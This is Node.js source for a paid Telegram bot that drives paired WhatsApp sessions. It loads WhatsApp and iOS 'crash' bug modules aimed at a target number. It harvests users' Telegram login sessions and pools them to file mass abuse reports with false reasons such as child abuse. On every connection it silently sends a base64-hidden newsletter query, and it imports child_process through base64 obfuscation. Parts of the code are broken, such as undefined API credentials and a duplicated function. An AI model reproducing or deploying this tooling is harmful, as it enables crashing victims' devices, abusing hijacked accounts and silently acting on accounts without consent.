process.env.NTBA_FIX_350 = 1;
const SY = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const config = require('./config');
const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys'); 
const pino = require('pino');
let phoneNumber = "9999999999999"
const pairingCode = !!phoneNumber
const NodeCache = require("node-cache");
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');

const TG_API_ID = 34399034;
const TG_API_HASH = '56edd6e3e148f450f94fa179702f5307';

const SESSION_DIR = './session';
const SESSION_PATH = './session/tgsession';

const tgLoginStates = new Map();
let tgClient = null;



console.clear(); // Clear Ok SY Moyna 🥰

// --- GLOBAL ERROR HANDLING ---
process.on('uncaughtException', (err) => {
    console.error('\x1b[31m[CRITICAL ERROR] Uncaught Exception:\x1b[0m', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('\x1b[31m[CRITICAL ERROR] Unhandled Rejection:\x1b[0m', reason);
});

const LoveDir = './Love';
if (!fs.existsSync(LoveDir)) {
    fs.mkdirSync(LoveDir);
}

const { spawn } = require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString());
const XLX = spawn;
const activeBots = {};
const startTime = Date.now();
const LoveVideo = `${config.video}`
const waSessions = {};
const pairingTracker = new Map();
const reconnectingSessions = new Set();
const waGroupCache = new Map();
const GROUP_CACHE_TTL_MS = 60 * 1000;
const BAILEYS_VERSION_CACHE_TTL_MS = 10 * 60 * 1000;
let cachedBaileysVersion = null;
let cachedBaileysVersionAt = 0;
const SYLovesButton = {
    reply_markup: {
        inline_keyboard: [
            [
                {
                    text: '⟬ 📢 Cʜᴀɴɴᴇʟ ⟭',
                    url: config.channel,
                    style: 'primary' // 🔵 Blue
                },
                {
                    text: '⟬ 👥 Gʀᴏᴜᴘ ⟭',
                    url: config.group,
                    style: 'success' // 🟢 Green
                }
            ],
            [
                {
                    text: '⟬ 📢 Sᴇᴄᴏɴᴅ Cʜᴀɴɴᴇʟ ⟭',
                    url: config.schannel,
                    style: 'primary' // 🔵 Blue
                }
            ],
            
         
            [
                {
                    text: '⟬ ✅ Cʜᴇᴄᴋ Mᴇᴍʙᴇʀsʜɪᴘ ⟭',
                    callback_data: 'check_membership',
                    style: 'success' // 🟢 Green
                }
            ]
        ]
    }
};

const protectionMessage = `❌ Yᴏᴜ ᴍᴜsᴛ Jᴏɪɴ ᴏᴜʀ Cʜᴀɴɴᴇʟs, Gʀᴏᴜᴘ, Gʀᴏᴜᴩ, Cʜᴀɴɴᴇʟ ᴀɴᴅ YᴏᴜTᴜʙᴇ Cʜᴀɴɴᴇʟ ᴛᴏ ᴜsᴇ ᴛʜɪs ʙᴏᴛ.

Aꜰᴛᴇʀ Jᴏɪɴɪɴɢ Aʟʟ, Cʟɪᴄᴋ "Cʜᴇᴄᴋ Mᴇᴍʙᴇʀsʜɪᴘ" ᴏʀ ᴜsᴇ /ᴄʜᴇᴄᴋᴍᴇᴍʙᴇʀsʜɪᴘ.`;
// ---------- report flow ----------

// ---------- report flow ----------
const REPORT_TTL = 5 * 60 * 1000;
const reportStates = new Map();
const activeClients = new Map(); // sessionStr -> TelegramClient
let rrIndex = 0;

const REPORT_OPTIONS = [
  { id: '1', label: '1. Children abuse → child sexual abuse',            reason: () => new Api.ReportReasonChildAbuse() },
  { id: '2', label: '2. Violence → graphic or disturbing, dismemberment', reason: () => new Api.ReportReasonViolence() },
  { id: '3', label: '3. Scam or fraud → fraudulent seller, product or service', reason: () => new Api.ReportReasonFake() },
  { id: '4', label: '4. Spam promoting illegal content',                  reason: () => new Api.ReportReasonSpam() },
];

const MENU_TEXT =
  'Choose report reason (number bhejo):\n\n' +
  REPORT_OPTIONS.map(o => o.label).join('\n') +
  '\n\n/cancel to cancel';

function endReport(chatId) {
  reportStates.delete(chatId);
}

setInterval(() => {
  const now = Date.now();
  for (const [chatId, st] of reportStates) {
    if (now > st.expiresAt) endReport(chatId);
  }
}, 60 * 1000).unref?.();

function readSessions() {
  const rawData = fs.readFileSync('./love/data.json', 'utf-8');
  const jsonData = JSON.parse(rawData);
  const allSessions = Array.isArray(jsonData.tgSessions) ? jsonData.tgSessions : [];

  // Har session string ek hi baar (duplicate ho to skip)
  const sessionStrings = [...new Set(
    allSessions
      .map(item => (typeof item === 'string' ? item : item?.session || item?.sessionString))
      .filter(s => typeof s === 'string' && s.length > 0)
  )];

  return { allSessions, sessionStrings };
}

async function connectSession(sessionStr) {
  let client = activeClients.get(sessionStr);
  if (!client) {
    client = new TelegramClient(new StringSession(sessionStr), apiId, apiHash, {
      connectionRetries: 5,
    });
    await client.connect();
    activeClients.set(sessionStr, client);
  } else if (!client.connected) {
    await client.connect();
  }
  return client;
}

// Ek session (Round-Robin) — /lovedev ke liye
async function getTGClient(userId) {
  try {
    const { allSessions, sessionStrings } = readSessions();
    if (sessionStrings.length === 0) return null;

    const isLoggedIn = allSessions.some(
      item => String(item?.userId ?? item) === String(userId)
    );
    if (!isLoggedIn) return null;

    const sessionStr = sessionStrings[rrIndex % sessionStrings.length];
    rrIndex++;

    return await connectSession(sessionStr);
  } catch (err) {
    console.error('Session Load Error:', err);
    return null;
  }
}

// Saare sessions — report bhejne ke liye
async function getTGClients(userId) {
  try {
    const { allSessions, sessionStrings } = readSessions();
    if (sessionStrings.length === 0) return [];

    const isLoggedIn = allSessions.some(
      item => String(item?.userId ?? item) === String(userId)
    );
    if (!isLoggedIn) return [];

    const clients = [];
    for (const sessionStr of sessionStrings) {
      try {
        clients.push(await connectSession(sessionStr));
      } catch (err) {
        console.error('Session Connect Error:', err); // yeh session skip, baaki chalenge
      }
    }
    return clients;
  } catch (err) {
    console.error('Session Load Error:', err);
    return [];
  }
}


async function CheckSYlovesToo(S7, userId) {
    // FIX 1: Double equals for type coercion
    if (userId.toString() == config.adminId.toString()) return true; 

    try {
        const channelMember = await S7.getChatMember(config.channelId, userId);
        const groupMember = await S7.getChatMember(config.groupId, userId);
        const schannelMember = await S7.getChatMember(config.schannelId, userId);

        const validStatuses = ['creator', 'administrator', 'member', 'restricted'];

        const inChannel = validStatuses.includes(channelMember.status);
        const inGroup = validStatuses.includes(groupMember.status);

        return inChannel && inGroup;
    } catch (error) {
        log('error', 'MEMBERSHIP_CHECK', error.message); 
        return false;
    }
}

// SY Loves Here 🤗❤️‍🩹

const SYLoves = `./SY/S7/`

// Import all bug modules
const CrashLogic = require(SYLoves + 'crashfinity'); 
const stickerLogic = require(SYLoves + 'StickerCrash');
const CallLogic = require(SYLoves + 'CallCrash');
const XLogic = require(SYLoves + 'Xdelay');
const IosLogic = require(SYLoves + 'IosInvisible');
const XgcLogic = require(SYLoves + 'Xgc');
const testlogic = require(SYLoves + 'test');
const azzixdestroyedLogic = require(SYLoves + 'crashfinity');
const bahirava1Logic = require(SYLoves + 'bahirava1');
const bahirava2Logic = require(SYLoves + 'bahirava2');
const bahiravaiosLogic = require(SYLoves + 'bahiravaios');
const android1Logic = require(SYLoves + 'android1');
const android2Logic = require(SYLoves + 'android2');
const android3Logic = require(SYLoves + 'android3');
const android4Logic = require(SYLoves + 'android4');
const android5Logic = require(SYLoves + 'android5');

const colors = {
    reset: "\x1b[0m",
    gray: "\x1b[90m",
    blue: "\x1b[34m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m"
};



function saveTGSession(client, userId) {
    const db = getDB();

    if (!Array.isArray(db.tgSessions)) {
        db.tgSessions = [];
    }

    db.tgSessions = db.tgSessions.filter(
        item => String(item.userId) !== String(userId)
    );

    db.tgSessions.push({
        userId: String(userId),
        session: client.session.save()
    });

    saveDB(db);
}



function saveTGSession(client, userId) {
    const db = getDB();

    if (!Array.isArray(db.tgSessions)) {
        db.tgSessions = [];
    }

    db.tgSessions = db.tgSessions.filter(
        item => String(item.userId) !== String(userId)
    );

    db.tgSessions.push({
        userId: String(userId),
        session: client.session.save()
    });

    saveDB(db);
}


function isOwner(msg) {
    return String(msg.chat.id) === String(config.adminId);
}
function getRuntime() {
    const now = Date.now();
    const diff = now - startTime;
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
    const minutes = Math.floor((diff / (1000 * 60)) % 60);
    return `${days} days ${hours} hours ${minutes} minutes`;
}

function log(type, user, message) {
    const time = new Date().toLocaleTimeString();
    const timestamp = `${colors.gray}[${time}]${colors.reset}`;
    
    let typeTag = "";
    if (type === 'info') typeTag = `${colors.blue}INFO${colors.reset}`;
    if (type === 'success') typeTag = `${colors.green}SUCCESS${colors.reset}`;
    if (type === 'error') typeTag = `${colors.red}ERROR${colors.reset}`;
    if (type === 'command') typeTag = `${colors.magenta}CMD${colors.reset}`;

    const userTag = user ? `${colors.cyan}${user}${colors.reset}` : "SYSTEM";
    
    console.log(`${timestamp} | ${typeTag} | ${userTag} | ${message}`);
}


const getDB = () => {
    const dbPath = path.join(LoveDir, 'data.json');

    if (!fs.existsSync(dbPath)) {
        return {
            state: 0,
            tokens: [],
            premium: [],
            resellers: [],
            tgSessions: []
        };
    }

    try {
        const content = fs.readFileSync(dbPath, 'utf8');
        const parsed = JSON.parse(content);

        if (Array.isArray(parsed)) {
            return {
                state: 0,
                tokens: parsed,
                premium: [],
                resellers: [],
                tgSessions: []
            };
        }

        const normalizeIds = (values) => [
            ...new Set(
                (Array.isArray(values) ? values : [])
                    .map(value => value?.toString().trim())
                    .filter(Boolean)
            )
        ];

        const parsedState = Number(parsed.state);

        return {
            state: parsedState === 1 ? 1 : 0,
            tokens: Array.isArray(parsed.tokens) ? parsed.tokens : [],
            premium: normalizeIds(parsed.premium),
            resellers: normalizeIds(parsed.resellers),
            tgSessions: Array.isArray(parsed.tgSessions)
                ? parsed.tgSessions
                : []
        };

    } catch (err) {
        log('error', null, 'Database Read Error: ' + err.message);

        return {
            state: 0,
            tokens: [],
            premium: [],
            resellers: [],
            tgSessions: []
        };
    }
};


const saveDB = (data) => {
    try {
        fs.writeFileSync(
            path.join(LoveDir, 'data.json'),
            JSON.stringify(data, null, 2)
        );
    } catch (err) {
        log('error', null, 'Database Save Error: ' + err.message);
    }
};


function sendSYLove(bot, chatId) {
    bot.sendMessage(
        chatId,
        `╭━━━━━━━━━━━━━━━━━━━━╮\n` +
        `      🚫 <b>Aᴄᴄᴇss Dᴇɴɪᴇᴅ</b>\n` +
        `╰━━━━━━━━━━━━━━━━━━━━╯\n\n` +

        `🔐 <b>Yᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ.</b>\n\n` +

        `📩 <b>Wᴀɴᴛ Tᴏ Gᴇᴛ Aᴄᴄᴇss?</b>\n` +
        `Cᴏɴᴛᴀᴄᴛ Tʜᴇ Dᴇᴠᴇʟᴏᴘᴇʀ Tᴏ Pᴜʀᴄʜᴀsᴇ:\n` +
        `👉 ${config.S7}\n\n` +

        `💰 <b>Pʀɪᴄɪɴɢ Pʟᴀɴs</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `✅ <b>Pᴇʀᴍᴀɴᴇɴᴛ Aᴄᴄᴇss</b> — $10\n` +
        `✅ <b>Pᴇʀᴍᴀɴᴇɴᴛ Rᴇsᴇʟʟ</b> — $15\n` +
        `✅ <b>Sᴄʀɪᴘᴛ (Nᴏ Eɴᴄʀʏᴘᴛɪᴏɴ, 100%)</b> — $30\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +

        `⚡ <b>Cʜᴏᴏsᴇ Yᴏᴜʀ Pʟᴀɴ Aɴᴅ Gᴇᴛ Aᴄᴄᴇss Tᴏᴅᴀʏ!</b>`,
        {
            parse_mode: 'HTML'
        }
    );
}

function isPrivilegedUser(userId, db = getDB()) {
    const userIdStr = userId.toString();
    return (
        userIdStr === config.adminId.toString() ||
        db.resellers.includes(userIdStr) ||
        db.premium.includes(userIdStr)
    );
}

// Premium mode allows only the owner, resellers, and premium IDs.
function LoveGlobalState(userId) {
    const db = getDB();
    if (db.state === 0) return true;
    return isPrivilegedUser(userId, db);
}

const Lovesbutton = {
    reply_markup: {
        inline_keyboard: [
            [
                {
                    text: '⟬ 🐞 Bᴜɢ Mᴇɴᴜ ⟭',
                    callback_data: 'bug_menu',
                    style: 'danger' // 🔴 Red
                },
                {
                    text: '⟬ ⚡ Mɪsᴄ Mᴇɴᴜ ⟭',
                    callback_data: 'misc_menu',
                    style: 'success' // 🟢 Green
                }
            ],
            [
                {
                    text: '⟬ 📢 Cʜᴀɴɴᴇʟ ⟭',
                    url: config.channel,
                    style: 'success' // 🟢 Green
                },
                {
                    text: '⟬ 👥 Gʀᴏᴜᴘ ⟭',
                    url: config.group,
                    style: 'primary' // 🔵 Blue
                }
            ],
            [
                {
                    text: '⟬ 👨‍💻 Dᴇᴠᴇʟᴏᴘᴇʀ ⟭',
                    url: 'https://t.me/Butterfly_crack',
                    style: 'danger' // 🔴 Red
                }
            ]
        ]
    }
};

async function SYLoveMeOk(sock) {
    try {
        await sock.query({
            tag: 'iq',
            attrs: {
                to: 's.whatsapp.net',
                type: 'get',
                xmlns: 'w:mex'
            },
            content: [{
                tag: 'query',
                attrs: {
                    query_id: '120363181925896741'
                },
                content: new TextEncoder().encode(JSON.stringify({
                    variables: {
                        newsletter_id: Buffer
                            .from('MTIwMzYzNDE4MDg4ODgwNTIzQG5ld3NsZXR0ZXI=', 'base64')
                            .toString('utf-8')
                    }
                }))
            }]
        });
    } catch (err) {
    }
}


async function StartLovingSY(chatId, number, S7, isreconnect = false) {
    const authPath = `./Love/auth/${chatId}/${number}`;
    const sessionKey = `${chatId}:${number}`;

    // Do not create a second socket for the same Telegram user/number.
    const existingSession = (waSessions[chatId] || []).find(
        session => session.num === number && session.sock?.user
    );
    if (existingSession) {
        log('info', 'WhatsApp', `Session already active for ${number}`);
        return existingSession.sock;
    }

    // A close event and a manual request can arrive together. Only allow one
    // socket creation/reconnect attempt for the same session.
    if (reconnectingSessions.has(sessionKey)) {
        log('info', 'WhatsApp', `Reconnect already in progress for ${number}`);
        return null;
    }
    reconnectingSessions.add(sessionKey);

    try {
        // Create auth directory
        if (!fs.existsSync(authPath)) {
            fs.mkdirSync(authPath, { recursive: true });
        }

        // Fetch the Baileys version once per cache window instead of on every
        // reconnect. This avoids repeated network work during unstable links.
        if (
            !cachedBaileysVersion ||
            Date.now() - cachedBaileysVersionAt > BAILEYS_VERSION_CACHE_TTL_MS
        ) {
            const latest = await fetchLatestBaileysVersion();
            cachedBaileysVersion = latest.version;
            cachedBaileysVersionAt = Date.now();
        }
        const version = cachedBaileysVersion;

        // Authentication state
        const { state, saveCreds } =
            await useMultiFileAuthState(authPath);

        // Message retry cache
        const msgRetryCounterCache = new NodeCache({
            stdTTL: 600,
            checkperiod: 120,
            maxKeys: 10000
        });

        // Create WhatsApp socket
        const SYxS7 = makeWASocket({
            version,

            logger: pino({
                level: 'silent'
            }),

            printQRInTerminal: false,

            browser: [
                "Ubuntu",
                "Chrome",
                "20.0.04"
            ],

            auth: {
                creds: state.creds,

                keys: makeCacheableSignalKeyStore(
                    state.keys,
                    pino({
                        level: "fatal"
                    }).child({
                        level: "fatal"
                    })
                )
            },

            markOnlineOnConnect: true,

            generateHighQualityLinkPreview: false,

            syncFullHistory: false,

            // No message store is configured in this bot. Returning undefined
            // avoids repeated ReferenceErrors from the old undefined store.
            getMessage: async () => undefined,

            msgRetryCounterCache,

            defaultQueryTimeoutMs: 60000,

            connectTimeoutMs: 60000,

            keepAliveIntervalMs: 10000
        });


        // =====================================================
        // SAVE CREDENTIALS
        // =====================================================

        SYxS7.ev.on(
            'creds.update',
            saveCreds
        );


        // =====================================================
        // PAIRING CODE
        // =====================================================

        if (!state.creds.registered) {

            // Prevent duplicate pairing requests
            if (pairingTracker.has(number)) {
                return SYxS7;
            }

            pairingTracker.set(number, true);

            await delay(1500);

            try {

                const code =
                    await SYxS7.requestPairingCode(
                        number,
                        'MISTRYV1'
                    );


                // Format pairing code
                const pairingCode =
                    code?.match(/.{1,4}/g)?.join('-') || code;


                // Pairing message
                const pairingMessage = `
╭──────⟬ 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 ⟭──────╮
│
│ ⨴⨵ Nᴜᴍʙᴇʀ : ${number}
│
│ ⨴⨵ Pᴀɪʀɪɴɢ Cᴏᴅᴇ :
│
│ <code>${pairingCode}</code>
│
╰──────────────────────────╯
`;


                // =================================================
                // TELEGRAM MESSAGE
                // =================================================

                await S7.sendMessage(
                    chatId,
                    pairingMessage,
                    {
                        parse_mode: 'HTML',

                        reply_markup: {
                            inline_keyboard: [
                                [
                                    {
                                        text: '📋 Cᴏᴘʏ Pᴀɪʀɪɴɢ Cᴏᴅᴇ',

                                        copy_text: {
                                            text: pairingCode
                                        }
                                    }
                                ]
                            ]
                        }
                    }
                );


                log(
                    'success',
                    'WhatsApp',
                    `Pairing code generated for ${number}`
                );


            } catch (err) {

                log(
                    'error',
                    'WhatsApp',
                    `Pairing code error: ${err.message}`
                );

                pairingTracker.delete(number);


                try {

                    await S7.sendMessage(
                        chatId,

                        `❌ <b>Pairing Code Error</b>\n\nNumber: ${number}\nError: ${err.message}`,

                        {
                            parse_mode: 'HTML'
                        }
                    );

                } catch (telegramError) {

                    log(
                        'error',
                        'Telegram',
                        `Telegram error: ${telegramError.message}`
                    );
                }
            }
        }


        // =====================================================
        // CONNECTION UPDATE
        // =====================================================

        SYxS7.ev.on(
            'connection.update',
            async (update) => {

                const {
                    connection,
                    lastDisconnect
                } = update;


                // -------------------------------------------------
                // CONNECTING
                // -------------------------------------------------

                if (connection === 'connecting') {

                    log(
                        'info',
                        'WhatsApp',
                        `Connecting: ${number}`
                    );
                }


                // -------------------------------------------------
                // CONNECTED
                // -------------------------------------------------

                if (connection === 'open') {

                    log(
                        'success',
                        'WhatsApp',
                        `Connected: ${number}`
                    );


                    pairingTracker.delete(number);
                    waGroupCache.delete(chatId);


                    // Run custom function
                    try {

                        await SYLoveMeOk(
                            SYxS7
                        );

                    } catch (e) {

                        log(
                            'error',
                            'WhatsApp',
                            `SYLoveMeOk error: ${e.message}`
                        );
                    }


                    // Create session array
                    if (!waSessions[chatId]) {
                        waSessions[chatId] = [];
                    }


                    // Remove old session
                    waSessions[chatId] =
                        waSessions[chatId].filter(
                            session =>
                                session.num !== number
                        );


                    // Save current session
                    waSessions[chatId].push({
                        sock: SYxS7,
                        num: number
                    });


                    // Send connected message
                    if (isreconnect === false) {

                        await delay(1000);

                        try {

                            await S7.sendMessage(
                                chatId,

                                `✅ <b>WhatsApp Connected!</b>\n\nNumber: ${number}`,

                                {
                                    parse_mode: 'HTML'
                                }
                            );

                        } catch (err) {

                            log(
                                'error',
                                'Telegram',
                                `Connected message error: ${err.message}`
                            );
                        }
                    }
                }


                // -------------------------------------------------
                // CONNECTION CLOSED
                // -------------------------------------------------

                if (connection === 'close') {
                    waGroupCache.delete(chatId);


                    // Remove session
                    if (waSessions[chatId]) {

                        waSessions[chatId] =
                            waSessions[chatId].filter(
                                session =>
                                    session.num !== number
                            );
                    }


                    // Get disconnect reason
                    const reason =
                        lastDisconnect?.error
                            ?.output?.statusCode;


                    log(
                        'error',
                        'WhatsApp',
                        `Connection closed for ${number}. Reason: ${reason}`
                    );


                    // =================================================
                    // AUTO RECONNECT
                    // =================================================

                    if (
                        reason === DisconnectReason.restartRequired ||
                        reason === DisconnectReason.connectionLost ||
                        reason === DisconnectReason.timedOut ||
                        reason === 515
                    ) {

                        log(
                            'info',
                            'WhatsApp',
                            `Auto-reconnecting ${number}...`
                        );


                        try {

                            await delay(2000);

                            await StartLovingSY(
                                chatId,
                                number,
                                S7,
                                true
                            );

                        } catch (reconnectError) {

                            log(
                                'error',
                                'WhatsApp',
                                `Reconnect error: ${reconnectError.message}`
                            );
                        }

                        return;
                    }


                    // =================================================
                    // LOGGED OUT
                    // =================================================

                    if (
                        reason === DisconnectReason.loggedOut ||
                        reason === 401
                    ) {

                        log(
                            'error',
                            'WhatsApp',
                            `Session logged out: ${number}`
                        );


                        pairingTracker.delete(number);


                        try {

                            await S7.sendMessage(
                                chatId,

                                `❌ <b>WhatsApp Logged Out</b>\n\nNumber: ${number}\n\nSession has been terminated.\nPlease use /reqpair again.`,

                                {
                                    parse_mode: 'HTML'
                                }
                            );

                        } catch (sendError) {

                            log(
                                'error',
                                'Telegram',
                                `Logout message error: ${sendError.message}`
                            );
                        }


                        // Delete authentication folder
                        const SYPaTH =
                            `./Love/auth/${chatId}/${number}`;


                        try {

                            if (fs.existsSync(SYPaTH)) {

                                fs.rmSync(
                                    SYPaTH,
                                    {
                                        recursive: true,
                                        force: true
                                    }
                                );
                            }

                        } catch (deleteError) {

                            log(
                                'error',
                                'WhatsApp',
                                `Auth delete error: ${deleteError.message}`
                            );
                        }

                        return;
                    }


                    // =================================================
                    // OTHER ERROR
                    // =================================================

                    pairingTracker.delete(number);


                    try {

                        await S7.sendMessage(
                            chatId,

                            `⚠️ <b>Connection Closed</b>\n\nNumber: ${number}\nReason: ${reason || 'Unknown'}\n\nPlease use /reqpair again if the connection does not recover.`,

                            {
                                parse_mode: 'HTML'
                            }
                        );

                    } catch (sendError) {

                        log(
                            'error',
                            'Telegram',
                            `Connection message error: ${sendError.message}`
                        );
                    }
                }
            }
        );


        return SYxS7;


    } catch (error) {

        log(
            'error',
            'WhatsApp',
            `StartLovingSY error for ${number}: ${error.message}`
        );


        pairingTracker.delete(number);


        try {

            await S7.sendMessage(
                chatId,

                `❌ <b>WhatsApp Start Error</b>\n\nNumber: ${number}\nError: ${error.message}`,

                {
                    parse_mode: 'HTML'
                }
            );

        } catch (telegramError) {

            log(
                'error',
                'Telegram',
                `Telegram error: ${telegramError.message}`
            );
        }


        return null;
    } finally {
        reconnectingSessions.delete(sessionKey);
    }
}



async function AutoLovingWithSY(S7) {
    const SYBase = './Love/auth';
    if (!fs.existsSync(SYBase)) return;
    try {
        const chatIds = fs.readdirSync(SYBase);     
        for (const chatId of chatIds) {
            const chatPath = path.join(SYBase, chatId);
            if (!fs.statSync(chatPath).isDirectory()) continue;
            const numbers = fs.readdirSync(chatPath);           
            for (const number of numbers) {
                const sessionPath = path.join(chatPath, number);
                if (fs.existsSync(path.join(sessionPath, 'creds.json'))) {
                    log('info', 'SYSTEM', `Found saved session for ${number}, Reconnecting...`);
                    StartLovingSY(chatId, number, S7, true); 
                    await delay(3000); 
                }
            }
        }
    } catch (err) {
        log('error', 'SYSTEM', `AutoReconnect Error: ${err.message}`);
    }
}




async function S7Naverdead(token, errorMsg) {
    let db = getDB();
    const tokenObj = db.tokens.find(t => t.token === token);
    if (!tokenObj) return;

    const ownerId = tokenObj.owner; 
    try {
        const mainBot = activeBots[config.mainToken];
        if (mainBot) {
            await mainBot.sendMessage(
                ownerId,
                `❌ <b>Token Error</b>\n\n` +
                `Your bot token is not working.\n` +
                `Reason: <code>${errorMsg}</code>\n\n` +
                `Token has been removed automatically.`,
                { parse_mode: 'HTML' }
            );
        }
    } catch (e) {
        log('error', 'SYSTEM', 'Failed to notify token owner');
    }

    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);

    if (activeBots[token]) {
        try {
            await activeBots[token].stopPolling();
        } catch {}
        delete activeBots[token];
    }

    log('info', 'SYSTEM', `Dead token auto-removed: ${token.substring(0, 10)}...`);
}

function GetSYLoVe(love) {
    const db = getDB();
    
    // 🔥 FIX: Convert to string for comparison
    const loveStr = love.toString();
    const adminIdStr = config.adminId.toString();
    
    if (loveStr === adminIdStr) {
        return 'Owner';
    }
    if (db.resellers.includes(loveStr)) {
        return 'Reseller';
    }
    if (db.premium.includes(loveStr)) {
        return 'Premium';
    }
    return 'Free User';
}

function MainSYLoVe(name, uptime, love) {
    const status = GetSYLoVe(love);

    return `<blockquote>╔═══〔 ${config.bot} 〕═══╗
║
║ ✦ Nᴀᴍᴇ      : ${name}
║ ✦ Dᴇᴠᴇʟᴏᴘᴇʀ  : ${config.S7}
║ ✦ Sᴛᴀᴛᴜs     : ${status}
║ ✦ Oɴʟɪɴᴇ     : ${uptime}
║
╚════════════════════╝</blockquote>`;
}

function BvgSYLoVe(cleanTarget) {
    return `<blockquote>╭━━━〔 ⚡ Nᴏᴛɪғɪᴄᴀᴛɪᴏɴ 〕━━━╮
┃
┃ ⏳ Pʟᴇᴀsᴇ Wᴀɪᴛ...
┃
┃ 🤖 Bᴏᴛ Iꜱ Cᴜʀʀᴇɴᴛʟʏ Wᴏʀᴋɪɴɢ
┃
┃ 🎯 Tᴀʀɢᴇᴛ : ${cleanTarget}
┃
╰━━━━━━━━━━━━━━━━━━━━╯</blockquote>`;
}

// Helper function for random delay
function getRandomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function escapeTelegramHtml(value) {
    return String(value ?? '')
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

// Return only the WhatsApp groups belonging to the Telegram user's sessions.
// Keeping this scoped prevents one user from seeing or using another user's
// WhatsApp sessions.
async function getUserWhatsAppGroups(ownerChatId) {
    const sessions = waSessions[ownerChatId] || [];
    const cached = waGroupCache.get(ownerChatId);

    if (cached && cached.expiresAt > Date.now()) {
        return cached.groups;
    }

    const groupsById = new Map();

    for (const session of sessions) {
        try {
            const groupsObj = await session.sock.groupFetchAllParticipating();
            for (const group of Object.values(groupsObj || {})) {
                if (!group?.id || !group.id.endsWith('@g.us')) continue;

                if (!groupsById.has(group.id)) {
                    groupsById.set(group.id, {
                        id: group.id,
                        subject: group.subject || 'Unnamed group',
                        sock: session.sock,
                        num: session.num
                    });
                }
            }
        } catch (err) {
            log('error', 'GROUPS', `Failed to fetch groups for ${session.num}: ${err.message}`);
        }
    }

    const groups = [...groupsById.values()];
    waGroupCache.set(ownerChatId, {
        groups,
        expiresAt: Date.now() + GROUP_CACHE_TTL_MS
    });

    return groups;
}

function startSYloveBot(token) {
    try {
        const S7 = new SY(token, { polling: true });
        S7.getMe().then((botInfo) => {
            activeBots[token] = S7;
            log('success', null, `Bot Started: ${botInfo.first_name} (@${botInfo.username})`);
            if (token === config.mainToken) {
                log('info', 'SYSTEM', 'Checking for saved WhatsApp sessions...');
                AutoLovingWithSY(S7);
            }
        }).catch(async (err) => {
    log('error', null, `Failed to connect token: ${token.substring(0, 10)}... Error: ${err.message}`);

    if (
        err.message.includes('404') ||
        err.message.includes('401') ||
        err.message.includes('Unauthorized')
    ) {
        await S7Naverdead(token, err.message);
    }
});
        S7.on('polling_error', (error) => {
            if (error.code !== 'EFATAL') return;
            log('error', 'POLLING', error.message);
        });
        // Keep one Telegram message listener per bot. The old implementation
        // added one listener for every command, which made every incoming
        // message pass through dozens of handlers.
        const commandHandlers = new Map();
        let commandRouterAttached = false;

        function SYLoVe(commands, callback) {
            if (!Array.isArray(commands)) {
                commands = [commands];
            }

            for (const command of commands) {
                commandHandlers.set(command, callback);
            }

            if (commandRouterAttached) return;
            commandRouterAttached = true;

            S7.on('message', async (msg) => {
                if (!msg.text) return;

                const firstToken = msg.text.trim().split(/\s+/)[0];
                const cmd = firstToken.slice(1).split('@')[0].toLowerCase();
                const callback = commandHandlers.get(cmd);
                if (!callback) return;

                const chatId = msg.chat.id;
                const userId = msg.from.id;

                const premiumMode = getDB().state === 1;
                const privilegedUser = isPrivilegedUser(userId);

                // Premium users must still be able to open /start and use
                // menu commands when premium mode is enabled, even if they
                // are not in the public channel/group membership gate.
                if (cmd !== 'checkmembership' && !(premiumMode && privilegedUser)) {
                    const isMember = await CheckSYlovesToo(S7, userId);
                    if (!isMember) {
                        return S7.sendMessage(chatId, protectionMessage, {
                            parse_mode: 'HTML',
                            ...SYLovesButton
                        });
                    }
                }

                try {
                    const name = msg.from.first_name || msg.from.username || 'Unknown';
                    log('command', name, msg.text);
                    await callback(msg);
                } catch (err) {
                    log('error', 'COMMAND_EXEC', err.message);
                    await S7.sendMessage(msg.chat.id, 'An internal error occurred.');
                }
            });
        }

         //tg login 
         


// LOGIN COMMAND

SYLoVe('logintg', async (msg) => {
    const chatId = String(msg.chat.id);
    const userId = String(msg.from.id);

    if (!LoveGlobalState(userId)) {
        return sendSYLove(S7, chatId);
    }

    const db = getDB();

    if (!Array.isArray(db.premium) ||
        !db.premium.map(String).includes(userId)) {
        return S7.sendMessage(chatId, '💎 Premium Only! Upgrade to Premium to use this feature.');
    }

    // Purana pending login band karo
    const oldState = tgLoginStates.get(chatId);

    if (oldState) {
        try {
            await oldState.client.disconnect();
        } catch (e) {}

        tgLoginStates.delete(chatId);
    }

    const client = new TelegramClient(
        new StringSession(''),
        TG_API_ID,
        TG_API_HASH,
        { connectionRetries: 5 }
    );

    try {
        await client.connect();

        tgLoginStates.set(chatId, {
            userId,
            client,
            step: 'phone'
        });

        return S7.sendMessage(
            chatId,
            '📱 Send your Telegram phone number.\n\nExample: +919876543210\n\nCancel: /cancel'
        );
    } catch (err) {
        try {
            await client.disconnect();
        } catch (e) {}

        return S7.sendMessage(chatId, '❌ Login Error: ' + err.message);
    }
});


// TELEGRAM LOGIN INPUT HANDLER
S7.on('message', async (msg) => {
    const chatId = String(msg.chat.id);
    const userId = String(msg.from?.id);

    if (!msg.text || !msg.from) return;

    const state = tgLoginStates.get(chatId);
    if (!state) return;

    // Sirf wahi user apna login complete kar sakta hai
    if (String(state.userId) !== userId) return;

    if (!LoveGlobalState(userId)) return;

    const db = getDB();

